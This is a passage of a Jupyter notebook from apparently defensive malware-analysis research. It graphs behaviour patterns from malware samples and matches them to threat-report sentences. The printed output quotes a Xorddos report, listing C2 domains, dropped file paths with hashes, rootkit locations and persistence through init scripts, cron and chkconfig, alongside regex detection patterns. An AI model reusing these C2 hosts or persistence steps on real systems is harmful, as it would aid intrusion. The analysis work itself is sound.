      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"176pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 176.34 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 172.34,-127 172.34,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.48,-87.29C52.57,-82 47.97,-75.75 45.34,-69 41.65,-59.49 45.6,-49.86 51.83,-41.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"54.65,-43.72 58.63,-33.9 49.39,-39.09 54.65,-43.72\"/>\n<text text-anchor=\"middle\" x=\"67.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M84.91,-87C88.31,-77.38 91.19,-65.1 89.34,-54 88.88,-51.24 88.23,-48.41 87.47,-45.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"90.72,-44.27 84.36,-35.8 84.05,-46.39 90.72,-44.27\"/>\n<text text-anchor=\"middle\" x=\"128.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6cb0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import graphviz\n",
    "\n",
    "class ItemMapper:\n",
    "    def __init__(self) -> None:\n",
    "        self.mapper = {}\n",
    "        self.index_counter:int = 1\n",
    "        # self.pretty_name = {\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        #     \"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        #     \"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "        # }\n",
    "        pass\n",
    "    def addItem(self, item:str) -> str:\n",
    "        # item = self.prettifyName(item) # 先不在這做~\n",
    "        if item in self.mapper.keys():\n",
    "            return self.mapper.get(item)\n",
    "        self.mapper[item] = str(self.index_counter)\n",
    "        self.index_counter += 1\n",
    "        return str(self.index_counter - 1)\n",
    "    def getSymbol(self, item:str):\n",
    "        return self.mapper.get(item, None)\n",
    "    # def prettifyName(self, item:str) -> str:\n",
    "    #     changed = self.pretty_name.get(item, None)\n",
    "    #     if changed:\n",
    "    #         return changed\n",
    "    #     return item\n",
    "\n",
    "def draw_asg_op_graph(asg_OPset: list[OperationPair], family=None):\n",
    "    dot = graphviz.Digraph(f'{family}_asg_OPset', comment='The Operational Pair Graph') \n",
    "    dot.node('Start', label=\"Malware (Subject)\")\n",
    "    mapper = ItemMapper()\n",
    "    for op in asg_OPset:\n",
    "        node_id = mapper.addItem(op.object)\n",
    "        dot.node(node_id, label=prettifyName(op.object)) # rename partial regex\n",
    "        if op.action:\n",
    "            dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "\n",
    "    # dot.graph_attr.update(ratio=\"0.4\")\n",
    "    u = dot.unflatten(stagger=3, fanout=True)\n",
    "    display(u)\n",
    "    del mapper\n",
    "    return u\n",
    "\n",
    "def draw_ctd_op_graph(fset:FamilySet):\n",
    "    for rem in fset.rem_lst:\n",
    "        # doc_OPset\n",
    "        if rem.doc_OPset is None or len(rem.doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} raw doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_doc_OPset\n",
    "        if rem.match_doc_OPset is None or len(rem.match_doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.match_doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} matched doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_ASG_OPset\n",
    "        if rem.OPset_order_index is None or len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in [fset.sample.OPset_ordered[i] for i in rem.OPset_order_index]:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"matched ASG OPset for doc {rem.reportname}\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "    return\n",
    "\n",
    "draw_asg_op_graph(sample.OPset, family=family)\n",
    "draw_ctd_op_graph(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: print matched sentence for specific document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Report: Xorddos-Ms.csv. Matched OP count: 11\n",
      "--\n",
      "OP #38 fetch [a-zA-z]:\\d{1,5}$ www.enoan2107.com:3306\n",
      "after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server:\n",
      "www.enoan2107.com:3306\n",
      "www.gzcfr5axf6.com:3306\n",
      "malicious activity threads\n",
      "after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.\n",
      "--\n",
      "OP #50 drop /run/ /run/gcc.pid\n",
      "\n",
      "dropped files\n",
      "dropped file path\tfile type\tsha-256\n",
      "/etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf\n",
      "/etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459\n",
      "/lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432\n",
      "/run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c\n",
      "/usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a\n",
      "/usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7\n",
      "/usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489\n",
      "/usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd\n",
      "/usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7\n",
      "/usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4\n",
      "/tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25\n",
      "/usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "\n",
      "--\n",
      "OP #27 install ^chkconfig$ chkconfig\n",
      "screenshot displaying chkconfig and update-rc.d commands installing the startup service\n",
      "figure 16. chkconfig and update-rc.d commands install the startup service\n",
      "argument-based code-flow\n",
      "xorddos has specific code paths corresponding to the number of arguments provided to the program.\n",
      "--\n",
      "OP #35 use /proc/ /proc/rs_dev\n",
      "\n",
      "xorddos uses /proc/rs_dev character device to communicate with the rootkit.\n",
      "--\n",
      "OP #30 create /var/run/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #40 fetch /var/run/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n",
      "--\n",
      "OP #29 create /var/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #39 fetch /var/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n",
      "--\n",
      "OP #41 fetch /run/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n",
      "--\n",
      "OP #20 drop /etc/init.d/ /etc/init.d/hflggwyfsc.elf\n",
      "figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf\n",
      "\n",
      "--\n",
      "OP #49 drop /etc/cron /etc/cron.hourly/gcc.sh\n",
      "\n",
      "dropped files\n",
      "dropped file path\tfile type\tsha-256\n",
      "/etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf\n",
      "/etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459\n",
      "/lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432\n",
      "/run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c\n",
      "/usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a\n",
      "/usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7\n",
      "/usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489\n",
      "/usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd\n",
      "/usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7\n",
      "/usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4\n",
      "/tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25\n",
      "/usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# 印出 matched 句子\n",
    "report_id = 3\n",
    "reportname = fset.rem_lst[report_id].reportname\n",
    "print(f\"Report: {reportname}. Matched OP count: {len(fset.rem_lst[report_id].match_doc_OPset)}\")\n",
    "for i, op in enumerate(fset.rem_lst[report_id].match_doc_OPset):\n",
    "    print(f\"--\\nOP #{op.step_number} {op.action} {op.object} {op.original_object}\")\n",
    "    print(f\"{op.original_sentence}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set()\n",
      "{<OP act=have, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=0x[0-9a-zA-Z]{8}>, <OP act=eserve, obj=0x[0-9a-zA-Z]{8}>, <OP act=r1,r2,r10,r11,lr, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=add, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=^sed$>, <OP act=look, obj=0x[0-9a-zA-Z]{8}>, <OP act=be, obj=0x[0-9a-zA-Z]{8}>, <OP act=go, obj=0x[0-9a-zA-Z]{8}>, <OP act=be, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=svc, obj=0x[0-9a-zA-Z]{8}>, <OP act=pack, obj=0x[0-9a-zA-Z]{8}>, <OP act=find, obj=0x[0-9a-zA-Z]{8}>}\n",
      "{<OP act=connect, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=modify, obj=/etc/rc>, <OP act=connect, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+>, <OP act=None, obj=/etc/rc>}\n",
      "{<OP act=add, obj=/etc/init.d/>, <OP act=add, obj=/etc/rc>, <OP act=format, obj=/etc/rc>, <OP act=None, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=None, obj=/proc/>, <OP act=open, obj=/proc/>, <OP act=format, obj=^sed$>, <OP act=read, obj=/proc/>, <OP act=execute, obj=/etc/rc>, <OP act=give, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=uname(.)($)>}\n",
      "{<OP act=open, obj=nsswitch.conf>, <OP act=se, obj=^sed$>, <OP act=start, obj=/etc/init.d/>, <OP act=None, obj=/sys/>, <OP act=None, obj=/proc/>, <OP act=gather, obj=/proc/>, <OP act=None, obj=UID>, <OP act=se, obj=/etc/rc>, <OP act=open, obj=resolv.conf>}\n"
     ]
    }
   ],
   "source": [
    "# 測試區\n",
    "for rem in fset.rem_lst:\n",
    "    print(rem.doc_OPset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bin/sed</th>\n",
       "      <th>/etc/rc</th>\n",
       "      <th>/etc/init.d/</th>\n",
       "      <th>/proc/</th>\n",
       "      <th>/etc/sed</th>\n",
       "      <th>/selinux</th>\n",
       "      <th>/sys/</th>\n",
       "      <th>bin/</th>\n",
       "      <th>lsb-release</th>\n",
       "      <th>uname(.)($)</th>\n",
       "      <th>...</th>\n",
       "      <th>^sh$</th>\n",
       "      <th>^sed$</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}</th>\n",
       "      <th>eth[0-9]$</th>\n",
       "      <th>0x[0-9a-zA-Z]{8}</th>\n",
       "      <th>permission:{0,1}[0-9]{0,4}</th>\n",
       "      <th>UID</th>\n",
       "      <th>GID</th>\n",
       "      <th>match</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
